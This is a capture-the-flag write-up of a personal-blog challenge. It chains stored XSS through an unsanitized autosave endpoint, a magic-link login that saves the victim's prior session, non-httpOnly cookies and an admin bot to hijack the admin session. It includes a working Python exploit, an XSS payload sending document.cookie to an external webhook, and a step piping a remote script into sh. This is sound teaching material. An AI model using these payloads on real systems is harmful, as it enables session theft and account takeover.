# Personal Blog XSS Challenge Writeup

## Challenge Overview

This challenge involves exploiting a stored XSS vulnerability in a personal blog application to steal the admin's session cookie and retrieve the flag from `/flag` endpoint.

## Vulnerability Analysis

### The Core Issue

The application has two different endpoints for saving content:

1. **`/api/save`** - Sanitizes content with DOMPurify before saving
2. **`/api/autosave`** - Stores raw content WITHOUT sanitization

```javascript
app.post('/api/save', requireLogin, (req, res) => {
  const rawContent = String(req.body.content || '');
  const sanitized = sanitizeHtml(rawContent);  // ← Sanitized!
  post.savedContent = sanitized;
  post.draftContent = sanitized;
  // ...
});

app.post('/api/autosave', requireLogin, (req, res) => {
  const rawContent = String(req.body.content || '');
  post.draftContent = rawContent;  // ← NOT sanitized!
  // ...
});
```

When viewing a post in the editor at `/edit/:id`, the application loads the draft content:

```javascript
app.get('/edit/:id', requireLogin, (req, res) => {
  const draftContent = post.draftContent || post.savedContent || '';
  return res.render('editor', {
    post,
    draftContent  // ← Unsanitized draft rendered in editor
  });
});
```

This creates a **self-stored XSS vulnerability** where malicious HTML/JavaScript stored via `/api/autosave` executes when the editor page loads.

### Magic Links - Session Hijacking Vector

The application provides "magic links" that automatically log users in:

```javascript
app.get('/magic/:token', (req, res) => {
  const record = db.magicLinks[token];
  
  const existingSid = req.cookies.sid;
  if (existingSid) {
    res.cookie('sid_prev', existingSid, cookieOptions());  // ← Stores previous session!
  }
  const sid = createSession(db, record.userId);
  res.cookie('sid', sid, cookieOptions());
  
  const target = safeRedirect(req.query.redirect);
  return res.redirect(target);  // ← Redirects to specified page
});
```

**Critical detail:** Before creating a new session, the application saves the existing `sid` cookie to `sid_prev`. This means when the admin bot visits our magic link, their admin session gets stored in `sid_prev`.

The magic link accepts a `redirect` parameter, allowing us to control where the victim lands after authentication.

### Admin Bot

The application includes a `/report` endpoint that allows users to submit URLs for an admin bot to visit:

```javascript
app.post('/report', requireLogin, async (req, res) => {
  const rawUrl = (req.body.url || '').trim();
  const target = normalizeReportUrl(rawUrl);
  if (!target) {
    return res.render('report', reportContext(null, 'Only local URLs are allowed.'));
  }
  // Proof-of-work check...
  
  const response = await fetch(`${BOT_ORIGIN}/visit`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: target })
  });
  // ...
});
```

This is our vector to make the admin interact with our malicious URL. The bot will visit with the admin's authenticated session.

### Cookie Configuration Weakness

Critically, the session cookies are configured with `httpOnly: false`:

```javascript
function cookieOptions() {
  return {
    httpOnly: false,  // ← JavaScript can access these cookies!
    sameSite: 'Lax',
    path: '/'
  };
}
```

This means our XSS payload can read `document.cookie`.

## Exploitation Strategy

The attack chain works as follows:

1. **Create malicious post** - Use `/api/autosave` to store XSS payload
2. **Generate magic link** - Create a magic link for our account with redirect to the malicious editor page
3. **Report to admin** - Submit the magic link to the bot/admin
4. **Session hijacking** - When admin visits:
   - Magic link logs them in as our user
   - Redirects to our malicious post editor
   - XSS payload executes with admin's cookies
   - Cookies are exfiltrated to attacker's webhook

## Exploit Code Breakdown

### 1. Registration & Login

```python
username = "yo" + str(randint(100,10000))

def register():
    s.post(URL + "register", data={"username":username, "password":username})

def login():
    s.post(URL + "login", data={"username":username, "password":username})
```

Creates a unique account to avoid collisions.

### 2. Create Malicious Post

```python
def post_xss():
    # Create new post and get its ID
    post_id = s.get(URL + "edit", allow_redirects=False).text.split("to /edit/")[1]

    # XSS payload - exfiltrates cookies (including sid_prev!)
    payload = "<img src=q onerror=fetch('https://webhook.site/[ID]/?'+document.cookie)>"
    
    data = {
        "postId": post_id,
        "content": payload
    }

    # Use autosave endpoint (no sanitization!)
    s.post(URL + "api/autosave", json=data, headers=headers)
    return post_id
```

The payload uses an `<img>` tag with invalid `src` to trigger `onerror`, which executes JavaScript to exfiltrate all cookies. Crucially, this will include both the `sid` (our session) and `sid_prev` (the admin's original session)!

### 3. Generate Magic Link with Redirect

```python
def generate_magic_link(post_id):
    # Create magic link token
    magic_link = BeautifulSoup(s.post(URL + "magic/generate").content, "html.parser")
                    .find("ul").find_all("a")[-1]['href']
    
    # Add redirect parameter pointing to malicious editor
    return URL + magic_link[1:] + "?redirect=http://localhost:3000/edit/" + post_id
```

This creates a URL like:
```
http://localhost:3000/magic/[TOKEN]?redirect=http://localhost:3000/edit/[POST_ID]
```

### 4. Report to Admin Bot

```python
def report(malicious_link):
    # Get PoW challenge
    r = s.get(f"{URL}report")
    challenge = re.search(r'pow_challenge" value="([^"]+)"', r.text).group(1)

    # Solve proof-of-work
    solution = subprocess.run(
        f"curl -sSfL https://pwn.red/pow | sh -s {challenge}",
        shell=True, capture_output=True, text=True
    ).stdout.strip()

    # Submit report with solved PoW
    s.post(f"{URL}report", 
        data={
            "url": malicious_link.replace(HOST, "localhost").replace("5000", "3000"), 
            "pow_challenge": challenge, 
            "pow_solution": solution
        }
    )
```

The report endpoint requires proof-of-work to prevent spam. Once submitted, the admin bot visits the URL.

## Flag Retrieval

After receiving the cookies at the webhook, you'll see something like:
```
sid=[attacker_session_id]&sid_prev=[admin_session_id]
```

The admin's session is in `sid_prev` and you use it to get the flag:

```python
admin_sid = "[STOLEN_SID_PREV_VALUE]"  # Extract from sid_prev cookie
s.cookies.set('sid', admin_sid)
flag = s.get(URL + "flag").text
print(flag)  # uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}
```

This retrieves the flag from the admin-only `/flag` endpoint.